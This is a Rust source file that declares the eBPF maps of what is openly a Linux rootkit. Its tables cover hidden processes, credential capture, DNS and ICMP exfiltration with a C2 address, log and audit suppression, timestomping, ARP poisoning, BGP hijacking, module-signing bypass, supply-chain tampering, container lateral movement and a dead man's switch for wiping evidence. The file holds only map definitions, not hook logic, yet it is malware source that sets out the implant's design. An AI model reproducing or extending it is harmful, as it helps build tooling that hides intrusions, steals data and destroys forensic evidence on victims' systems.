use aya_ebpf::{
    macros::map,
    maps::{HashMap, PerCpuArray, ProgramArray, RingBuf},
};
use common::{
    BgpHijackEntry, ContainerProbeResult, DnsExfilChunk, IcmpExfilPayload, LsmOverrideEntry,
    PhantomConnState, PortKnockConfig, PortKnockState, ProcSpoofEntry, RootkitConfig,
    SlackHideEntry, SupplyChainTarget, TaskPatchRecord, TimestompEntry, TrafficProfile,
};

#[map]
pub(crate) static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static CONFIG: HashMap<u32, RootkitConfig> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static EVENTS: RingBuf = RingBuf::with_byte_size(256 * 1024, 0);

#[map]
pub(crate) static GETDENTS_BUFS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

#[map]
pub(crate) static GETDENTS_RETS: HashMap<u64, i64> = HashMap::with_max_entries(1024, 0);

#[map]
pub(crate) static MONITORED_TTYS: HashMap<u64, u8> = HashMap::with_max_entries(128, 0);

#[map]
pub(crate) static CRED_EVENTS: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);

#[map]
pub(crate) static SPOOFED_PPIDS: HashMap<u32, u32> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static DNS_EXFIL_QUEUE: HashMap<u32, DnsExfilChunk> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static PROTECTED_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static TIMESTOMP_INODES: HashMap<u64, TimestompEntry> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static LOG_SUPPRESS_PATTERNS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static OBFUSCATE_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct VfsReadCtx {
    pub buf_ptr: u64,
    pub inode: u64,
    pub count: u64,
}

#[map]
pub(crate) static VFS_READ_ARGS: HashMap<u64, VfsReadCtx> = HashMap::with_max_entries(1024, 0);

#[repr(C)]
pub(crate) struct ScratchBuf {
    pub data: [u8; 4096],
}

#[map]
pub(crate) static SCRATCH_BUF: PerCpuArray<ScratchBuf> = PerCpuArray::with_max_entries(1, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct SyslogCtx {
    pub syslog_type: u32,
    pub _pad: u32,
    pub buf_ptr: u64,
    pub len: u64,
}

#[map]
pub(crate) static SYSLOG_ARGS: HashMap<u64, SyslogCtx> = HashMap::with_max_entries(256, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct GetattrCtx {
    pub kstat_ptr: u64,
    pub inode: u64,
}

#[map]
pub(crate) static GETATTR_ARGS: HashMap<u64, GetattrCtx> = HashMap::with_max_entries(256, 0);

#[map]
pub(crate) static AUDIT_CTX_PTRS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

#[map]
pub(crate) static DNS_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static HIDDEN_NETNS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static OWN_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct BpfCmdCtx {
    pub cmd: u32,
    pub _pad: u32,
}

#[map]
pub(crate) static BPF_CMD_ARGS: HashMap<u64, BpfCmdCtx> = HashMap::with_max_entries(256, 0);

#[map]
pub(crate) static PROC_MODULES_INO: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static MEMFD_TRACKER: HashMap<u32, u64> = HashMap::with_max_entries(64, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct MemfdCtx {
    pub flags: u32,
    pub _pad: u32,
}

#[map]
pub(crate) static MEMFD_ARGS: HashMap<u64, MemfdCtx> = HashMap::with_max_entries(256, 0);

#[map]
pub(crate) static SYSLOG_FD_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static WIPE_FLAG: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static ICMP_EXFIL_QUEUE: HashMap<u32, IcmpExfilPayload> =
    HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static ICMP_C2_ADDR: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static ICMP_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static HIJACK_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static CONTAINER_STATE: aya_ebpf::maps::Array<ContainerProbeResult> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

// ──────────────────────────────────────────────
// Kernel Evasion Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static KPROBE_DETECT_STATE: HashMap<u64, u8> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static TAIL_CALL_PROGS: ProgramArray = ProgramArray::with_max_entries(16, 0);

#[map]
pub(crate) static FTRACE_BLIND_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static BPF_ITER_STATE: HashMap<u32, u64> = HashMap::with_max_entries(16, 0);

// ──────────────────────────────────────────────
// Memory & Process Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static VDSO_HOOK_ADDRS: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static SHM_CHANNEL: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);

#[map]
pub(crate) static UFFD_TARGETS: HashMap<u32, u64> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static COREDUMP_PIDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

// ──────────────────────────────────────────────
// Network Covert Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static ISN_COVERT_DATA: HashMap<u32, u32> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static IPV6_EXT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static ARP_POISON_TABLE: HashMap<u32, [u8; 6]> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static PORT_KNOCK_SEQ: HashMap<u32, PortKnockState> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static PORT_KNOCK_CONFIG: aya_ebpf::maps::Array<PortKnockConfig> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static BGP_HIJACK_PREFIXES: HashMap<u32, BgpHijackEntry> =
    HashMap::with_max_entries(16, 0);

// ──────────────────────────────────────────────
// Hardware Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static DR_WATCH_ADDRS: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static PMC_COVERT_DATA: HashMap<u32, u64> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static TSC_BASELINE: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

// ──────────────────────────────────────────────
// Anti-Forensics Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static AUDIT_KILL_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static SLACK_HIDE_INODES: HashMap<u64, SlackHideEntry> =
    HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static JOURNAL_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static PROC_SPOOF_PIDS: HashMap<u32, ProcSpoofEntry> = HashMap::with_max_entries(64, 0);

// ──────────────────────────────────────────────
// Advanced Persistence Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static INITRAMFS_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static MODSIGN_BYPASS_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static BPF_PIN_PATHS: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

// ──────────────────────────────────────────────
// Port Knock Allowlist (authenticated source IPs)
// ──────────────────────────────────────────────

#[map]
pub(crate) static PORT_KNOCK_ALLOWED: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

// ──────────────────────────────────────────────
// Hypervisor Evasion Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static HYPERVISOR_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static HV_TSC_OFFSETS: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static HV_BLIND_ADDRS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

// ──────────────────────────────────────────────
// Polymorphic Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static MORPH_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static MORPH_SEED: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static OPAQUE_PRED_MAP: HashMap<u32, u64> = HashMap::with_max_entries(16, 0);

// ──────────────────────────────────────────────
// Phantom Stack Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static PHANTOM_CONNS: HashMap<u64, PhantomConnState> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static PHANTOM_LISTEN_PORTS: HashMap<u16, u8> = HashMap::with_max_entries(8, 0);

#[map]
pub(crate) static PHANTOM_TX_QUEUE: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);

// ──────────────────────────────────────────────
// Container Lateral Movement Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static CGROUP_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static CONTAINER_NS_MAP: HashMap<u32, u64> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static LATERAL_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

// ──────────────────────────────────────────────
// DMA Covert Channel Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static DMA_STASH_ADDRS: HashMap<u64, u64> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static PCIE_TLP_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static IOMMU_STATE: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

// ──────────────────────────────────────────────
// Behavioral AI Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static BEHAVIOR_BASELINE: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(16, 0);

#[map]
pub(crate) static SYSCALL_HISTOGRAM: PerCpuArray<u64> = PerCpuArray::with_max_entries(16, 0);

#[map]
pub(crate) static THROTTLE_STATE: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

// ──────────────────────────────────────────────
// Supply Chain Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static PKG_MANAGER_HASHES: HashMap<u64, u8> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static SUPPLY_PATCH_TABLE: HashMap<u64, SupplyChainTarget> =
    HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static EXECVE_MONITOR_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

// ──────────────────────────────────────────────
// Dead Man's Switch Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static DEADMAN_CONFIG: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static HEARTBEAT_TRACKER: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(2, 0);

#[map]
pub(crate) static EVIDENCE_PATHS: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(32, 0);

// ──────────────────────────────────────────────
// BPF Parasitism Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static DETECTED_BPF_PROGS: HashMap<u32, u64> = HashMap::with_max_entries(128, 0);

#[map]
pub(crate) static PARASITE_TARGETS: HashMap<u32, u32> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static HIJACK_PROG_ARRAY: ProgramArray = ProgramArray::with_max_entries(16, 0);

// ──────────────────────────────────────────────
// Category 1: Advanced Rootkit Techniques Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static TASK_PATCH_TABLE: HashMap<u32, TaskPatchRecord> =
    HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static LSM_OVERRIDE_TABLE: HashMap<u32, LsmOverrideEntry> =
    HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static IDT_SHADOW: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(256, 0);

#[map]
pub(crate) static HIDDEN_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static LIVEPATCH_TARGETS: HashMap<u64, u64> = HashMap::with_max_entries(16, 0);

// ──────────────────────────────────────────────
// Category 2: Network Stealth Layer Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static RAW_C2_PORTS: HashMap<u16, u8> = HashMap::with_max_entries(8, 0);

#[map]
pub(crate) static RAW_C2_STATE: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static TC_INJECT_QUEUE: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);

#[map]
pub(crate) static DOH_FRONT_DOMAINS: HashMap<u32, [u8; 32]> = HashMap::with_max_entries(8, 0);

#[map]
pub(crate) static TRAFFIC_PROFILE_MAP: aya_ebpf::maps::Array<TrafficProfile> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

// ──────────────────────────────────────────────
// Category 4: Persistence Mechanisms Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static PIN_PATH_TABLE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static CGROUP_PERSIST_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static MODPARAM_TARGETS: HashMap<u64, [u8; 32]> = HashMap::with_max_entries(8, 0);

#[map]
pub(crate) static BOOT_LOADER_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(2, 0);
